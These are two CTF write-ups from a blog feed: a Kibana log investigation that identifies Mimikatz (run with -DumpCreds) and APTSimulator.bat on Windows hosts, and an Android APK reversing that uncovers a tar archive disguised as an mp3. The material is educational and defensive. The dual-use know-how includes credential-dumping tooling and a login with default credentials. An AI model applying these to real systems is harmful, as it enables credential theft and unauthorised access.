&lt;p&gt;This was a challenge from the DefCamp CTF 2020 rated with 193 points (Q1) and 208 points (Q3). It was about investigating an security breach inside some Windows hosts by using logs collected from a ELK (Elasticsearch, Logstash, Kibana) system.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;First step was to download the challenge zip, and execute then different commands they provide in the description.&lt;/p&gt;

&lt;p&gt;To get the IP of the kibana first we must find out the name of the container with ‘docker container ls’ and we find that it’s elastic_kibana_1. Then, we use ‘docker container inspect elastic_kibana_1’ to get information about the container and, also, the IP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/A3KCH1zK26GrlIaPNpVEbbkpx2vWo4cbbp0mR1p8HOeq7VmuIzCr5a2goOJTKi0-lOPYCEuKz9_ymzK6vZH-Sy6cKig6ngjFINqOgHZSz-MkZIwz3LbhGSly8Ysg2vwnTZ2tS5Rt&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We connect to [http://172.18.0.2:5601/] and a login screen appears. We try the default login credentials (which are elastic:changeme) and we get in.&lt;/p&gt;

&lt;p&gt;Then we go to the left panel -&amp;gt; Kibana -&amp;gt; Discover. We set the date range to the one in the description and we get:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/HWnKffSSvJKfR3y1GvtTUSYmf5EFM2K3ygBCjsbxsETjp0bpE09Exj488RfViLf0mde_zsVt7yJCmztyqyfNVU3E1RHZ7Sqw1rv_8KrZAIG2Z_YTGQ8YLhQOuYfeY3Uv9A17JWht&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are almost 5000 hits so let’s use the filter to find the solutions.&lt;/p&gt;

&lt;h2 id=&quot;q1&quot;&gt;Q1&lt;/h2&gt;

&lt;p&gt;The description talk about some tool to dump passwords. Let’s check what commands were used by filtering with the &lt;strong&gt;cmd.exe&lt;/strong&gt; and &lt;strong&gt;powershell.exe&lt;/strong&gt; processes.&lt;/p&gt;

&lt;p&gt;We are going to filter the fields with the following one so it’s easier to see them:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/vC9VpeXbXp_eKMRZBuSYuwPncZFBkJOmn4LUYL6vj4ZvvsF7K2j0KN_B-WxKZ0QlmXNCcwWppSMRqOqG-g2uC4RCRVfttlHxnP5gpIHocf4nl2-nnPf4Gum_wsgfQLTRMwzK0O-j&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By inspecting the &lt;strong&gt;cmd.exe&lt;/strong&gt; commands we found some weird commands related to the attack but nothing related to the passwords.&lt;/p&gt;

&lt;p&gt;Let’s check the &lt;strong&gt;powershell.exe&lt;/strong&gt; logs. At Dec 4, 10:37:11 we can see the malware is downloading some software and executing it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/3au6lZodEQ8DohHNqxoktLYSQ940G6ZwyUOrDiy0x6fC6xZRMhBBwNL5e2v529SBpgT5RI1CXWH5WW1UjKjOYErre47TDGq6ZSUdMpqbRZN6e4vtzI_VSHaaLrB4JuJ0gvhfPoqt&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By searching that name we get the tool &lt;strong&gt;Mimikatz&lt;/strong&gt;, which is used to dump Windows passwords, among other things. The parameter (-DumpCreds) also is an indicator of what it’s doing. They ask us about the process name so let’s search around that moment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/spuGiopMkeemIMeKl0FE4sId7KdSg3c4HxbHeBXl0PeWvqtogxufeD68V5Ta5wJm6ogW7NtZbJtT4dlH7_7d58_dpMh7pDjO-Pz2qY1rfG4wQxd2JzZhmfS6EsaN__DJWuD7XjWN&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Just a couple moments before, a mim.exe was executed. Let’s filter by that name:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/y9y6zM1hocZk0XFAXlh-O-YjMALOGV5nMQcjToDqBMxeuQg7t2vzH49_IjYwOJPsKHSJBKXDuf0jUy2Z0Up5xsvZUuHc6NiznUc9azE4WIc_IWVicrZxLJUE2sHqj6EYpiLNrl53&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It looks like this is the program that was dumping the passwords so the flag will be: ctf{mim.exe}&lt;/p&gt;

&lt;h2 id=&quot;q3&quot;&gt;Q3&lt;/h2&gt;

&lt;p&gt;They told us about some APT script they used to start the attack so let’s back to the cmd.exe logs. Just a few logs from the beginning we find something promising:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/YTza3KWArxM0SCxJ6u2YDR_l0X2dU7KGT8ituiay9G7J7OlBrm3Yt2GFrQ-BsrWGl9df53mP3Xr7AIfKEaatG9qYouxe9SIWRdKE7QHpdnVD08tpV49WIAMX8F-GKp9uCUS6Fd-Q&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That name really looks suspicious. We search that on Google and we find (https://github.com/NextronSystems/APTSimulator). This is a tool set to perform APT attacks for simulations.&lt;/p&gt;

&lt;p&gt;But, we have to be sure that it was the first one. So let’s filter by date from the first log to Dec 4, 09:32:15.&lt;/p&gt;

&lt;p&gt;We perform an investigation by 30 min ranges:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-uYI2jD0qj44ZRY_0MrZIvWk3R8S2Kw-W00Uog-YtTeIWgTHQ0DSHAFFpokOKVKjmuxZNx5RkYDYu4Sz5LNqiWxplT7vX52fryTs9-OXnSXevlQdMg1V9DDFVx90cPUyWU4gAgVz&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The only suspicious command is that p.exe but it doesn’t look like it’s the responsible for the APT attacks.&lt;/p&gt;

&lt;p&gt;According to the investigation, we determined that the guilty is the &lt;strong&gt;APTSimulator.bat&lt;/strong&gt; so the flag will be ctf{APTSimulator.bat}&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="Userspace" /><category term="Exploitation" /><summary type="htmlsummary></entry><entry><title type="html">Modern login</title><link href="http://0.0.0.0:4000/2020/12/08/modern-login.html" rel="alternate" type="text/html" title="Modern login" /><published>2020-12-08T00:00:00+01:00</published><updated>2020-12-08T00:00:00+01:00</updated><id>http://0.0.0.0:4000/2020/12/08/modern-login</id><content type="html" xml:base="http://0.0.0.0:4000/2020/12/08/modern-login.html">&lt;pre style=&quot;font-size: 0.5rem; text-align: center&quot;&gt;
                          ,                          *                          
                           **                       **                          
                            ,*     ,*********     ,*                            
                             **********************.                            
                          *****************************                         
                       ,*********************************                       
                     .******    ****************.   *******                     
                    ****************************************                    
                   ,*****************************************                   
                   *******************************************                  
                                                                                
        ,*****,   ,*******************************************    ******.       
       *********  ,*******************************************  ,*********      
       *********  ,*******************************************  **********      
       *********  ,*******************************************  **********      
       *********  ,*******************************************  **********      
       *********  ,*******************************************  **********      
       *********  ,*******************************************  **********      
       *********  ,*******************************************  **********      
       *********  ,*******************************************  **********      
       *********  ,*******************************************  **********      
       *********  ,*******************************************   ********,      
         .***.    ,*******************************************     ,**,         
                  ,*******************************************                  
                  ,*******************************************                  
                  .*******************************************                  
                           **********       *********                           
                           **********       *********                           
                           **********       *********                           
                           **********       *********                           
                           **********       *********                           
                            ********        ,*******,                           
&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;This was an Android reversing challenge from the DefCamp CTF 2020 rated with 50 points. The description said:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;This should rock your life to the roots of your passwords.&lt;/p&gt;

  &lt;p&gt;Flag format: CTF{sha256}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;p&gt;They give us an apk so my first approach was to execute it to see how it worked. I connected my phone to my PC, enabled USB debugging under the developer options in my phone and installed it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/ZiAtp727d2_IfnEEP60Tp3sBDJtzOKJ1mmdbgM-urbVxu7fkIVjobuxMoPNim033-16vj78Y7NOewf1zr09_XGZ7s3zmV0GES7MX8QfBgPyfevTKgeusf364baZfqxBQCFpKazbN&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is how the app looks:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/UuHHsUHBqLhmGTK_EX7ARl4jUroNo54uHPwoTblnxvRyzvXKfVxQeP6jP8F8r9uwXEOrjE3f7He9qW_DY_i5LUocUyx5zXN1Z2mbMjTNSvcFz98FYw7wSLRLjkR15LWuVBvwhZ-k&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It shows an input and when we hit Submit, it does nothing. Okay, that doesn’t help us a lot. So let’s get the contents of the apk.&lt;/p&gt;

&lt;p&gt;For that, we are going to use &lt;a href=&quot;https://ibotpeaches.github.io/Apktool/&quot;&gt;apktool&lt;/a&gt; which is used for reversing Android applications. (I’m not covering the installation process because it’s already on the page.)&lt;/p&gt;

&lt;p&gt;We run it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d&lt;/code&gt; to decompress the app into a folder with the same name:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/jwZbHEiMDthomMLJ8ukAnCnGvEXfWDusHVRz1Pkq-OLwp2uL-flgeR75HKoAji2YnrY7xsAhG0nJcs-kAmpUdQzW8cVvJMm19DDVTkuiqAOuhCmDztg-gf-kDODo5kZXxZnhSMvC&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is what the program generates:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/aEYRNDQ9tcaVstmPhw0DRUB-pmL1ftkLu7bLBmOMXrh1ymKN-ggbcwDE1KViz3y8LDweui2_LePTkguQxouEaBGqx6StHoeDTmM6y77caCq7Fmn5NwxoqrEgZYv0r9L7GLgtzRBH&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The original Java/Kotlin files are converted to smali files which are a bit different. We found a lot of packages and classes inside the smali folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/S7J-W6yjxukDZxSG-uhyt8iBfiFpM3cF7wWkviwbfEs3bpiOK9F8odHC8DAPrHM2fZdOOrso66Z_BrrWlKWyXiqFaY1WqOVpbRQWbeh5hy9ZO0Yx5usMpY4qzBBbpT9VAo8G_89d&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When looking for the flag directly inside the classes we don’t get any match. So, let’s take another road. Let’s find out what’s being executed when we access the application. If there is an input field maybe we could get something there.&lt;/p&gt;

&lt;p&gt;First, let’s find out what’s the apk package name. Go to the AndroidManifest.xml file and there we can see an xml tag with the package name:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/6vfR-6qihu0Gnf5elaoStm8NpQoydvWF3lVvqaCKXgfRouYXAsOaeyHtLD2QGaH5DFqa_ga-mxTQuNsb4MOk-msjH53NVTgTZ9BwzYCU8FL1gQpTwrOI-ChYAn5cc95jP01kCkQq&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s go back to the phone and adb. Open the application and get a shell inside the phone using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt; command:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/TG-pzlBX2eaqTqU1uK8Tdup4OmoJW3w5rC-1wjDDYOh_t7BD5W2zxgZNFLn8a2Z792cEg_ynSkOCGwdNQRO2A8624mvUXBaT_bKJKVZoU4vP234YYRXVUN4ulM6fYkcI4xN976LP&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, let’s use the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dumpsys window windows&lt;/code&gt; to get information about the open apps and we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; to filter by using the package name:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/KAQcYQJ3zGbR2dW6VPw_CEmd_2goJoRPxA9hhjp6w3WpgPxrCHMTSoBETIEpAx6UvjQ4lxt0dr51ejeLcytPCKsgxzdL-IY60gc7S-Fpmz7R5Nnb4R0ICzPZVW5KlyiMiSEcrwNz&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we found the Activity name, &lt;strong&gt;org.kivy.android.PythonActivity&lt;/strong&gt;. Now we know we have to search inside that package. Back to the code!&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;We start to look inside the kivy folder, searching for something interesting inside the PythonActivity.smali. Inside the &lt;strong&gt;onCreate&lt;/strong&gt; function we notice something at the end.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/0mR-QZZviP2tv2m8D0a5RfB6x9q8X8eFvsvFkDyppnQC1cNLv6jdC1G0-KQk0_-4wfBlb451guO2kJqDhkQU00ROyRJDuJkwnU_OrIt-P8-AUCm7D2biKcURA3V4owxnSSpjhUIU&quot; alt=&quot;&quot; /&gt; Maybe the code is hidden somehow and get’s unpacked when the app is started?&lt;/p&gt;

&lt;p&gt;Inside the file &lt;strong&gt;PythonActivity$UnpackFilesTask&lt;/strong&gt; I found it’s actually delegating the task to &lt;strong&gt;PythonActivityUtil&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/9GcogHw42ZcBphkrbrFH_J8MjV3DXq2SP7XeuhjrYDLbyctY4Vu8pjW3flCktg2mT-25bvudfImnbu2CYhYGEcKhhVA5qrYI6i2nIJYQl9Y1RkiNRRP7WKRcwaa9sYHPTkmYH2xp&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s take a look at that function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/7HaQbK4MQUWiUsjnalPeBa14VoxZGF1jJ5lVJ_DDqlVohXV6NnL_doN9DFyJX2zhX3LhTvb03NmYgfqrIKnhPxmnLLYgiH4oYkk92bYv2DHwOefOb1N4hShWTjU4sNzSeCmzxUVa&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looks like it’s actually unpacking something here. It does a lot of things here but looking at the strings used we find something:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/TmT0hFl4sVHSk3wK92ofbJ9YSQvFF27P0H983vQIIWISzB4EsgVlZw5BpNAnMM-V0JDwdrN73TgEyMlbNy1l2Fw6-OfIiSci1m40CNXVb4jqk0m6MgPgfuqHBCacYhy-IXk6YsvN&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/3FD6c9skD-Zkkcp7MmYJ9QMuIZM-1KDMf7CXtPcNDf91rggjibkZ_WVH3_Ki_SDTYIZbexr-LLeKBO_Gkyr8Foi7OwTGVMlsPH3T9zisiBZ5C3ZJnrZXuEew3DWaWhbGD_ZxNv4U&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So it’s unpacking something from an &lt;strong&gt;.mp3&lt;/strong&gt;? Let’s check that. Apktool also unpacks the assets inside an ‘assets’ folder. There is a &lt;strong&gt;private.mp3&lt;/strong&gt; file. That matches what we saw inside that function, right?&lt;/p&gt;

&lt;p&gt;Let’s check with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/YdX0dG6FwtF6zPkb6acyfLXgcD3bbGvHw1b5Y-EibGj2Di3IjsyCeJIDtj0Z20Dc0NkxQ5grz8XHY8HwDQ6rVH2wSw1qbd6gWTdgxXwAacB4x2smneDhSAUU94lEHMv-FKzJE8zN&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s definitely not an mp3 file. Let’s decompress it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-IRIooCruOYjCuIBrPYCjbiTgmBiSDC-vUUk_Pa6aiR3DgUKm7vOp3kWSUJTXrJnMlE7QezrZQnT0py93tYzyoICrSBgnyNwSyrFueL7-KEZXgcPJlqZAOuEdU9Mu8Mfk_EIOlX7&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And a bunch of files and folders are created:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/aONVhL2p3lt_XAe36B-Gi6Frr2ZANR-8mTDlULs0Ye20iRAwYyIrsNW74XA9xbz4LFHP0GJh1XmNR-JDM1E0cjmeigC6XeWdag8eOtaC0Vw0HT2VEIsJ6ejnFpd75VQpnX-T4NiR&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can start by checking main.py (I mean, it’s the main. Makes sense):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/PnCvC2kELYKOOAU6mst3oTtoqvCAM7KfaL-DWYMRRvVrPHCnqBOfhNrl0BxSXRsFJ7KQdl6SmOyjSrtR9Cyz1DwzQJeZHzbe-KRdieWYV9TSyN67UGbMRHFC3I5ndtZj0f00KDMS&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see an auth function. That looks promising. It looks like it’s returning the contents of &lt;strong&gt;U&lt;/strong&gt; if it succeeds. Let’s clean that up.&lt;/p&gt;

&lt;p&gt;Remove all the parts that are related to Android so we get an executable python file. That means deleting the import from kivy, the self.root accesses, the z.text and then moving the auth function outside the Main class and delete Main.&lt;/p&gt;

&lt;p&gt;(As you can see the U it’s only affected by g, which is just a bunch of bytes and the functions used also doesn’t use any of that so we can delete all of that without worrying.)&lt;/p&gt;

&lt;p&gt;This is the final file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/oYojKi4hm94QgT6OWuauLlLFIIOyROlOCq0DkE1atKsPQGV4eV4TP2GS1glJ1i0jV-dkofXGPEpE8frH_RaQ3NHRz0-CcHADGy_75HcqULFpE1ZvkX0zIlyrCtIt9wIzcha-1AB-&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So let’s add a print to that auth function to check the contents of &lt;strong&gt;U&lt;/strong&gt;. Execute it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/fBjfV0dQMq4RTrLo41tb9P-KYUlOvgX6skcUWc5RdDy8WgUc39_E-pIUUJDfYFLIWZdXv58UEPEgmMO01l3jorFR9EovbNWa-SPRRpZxrFFfJB_NLsKOhnLUZ6r-36cgciP-graK&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there is the flag!&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="Userspace" /><category term="Exploitation" /><summary type="htmlsummary></entry></feed>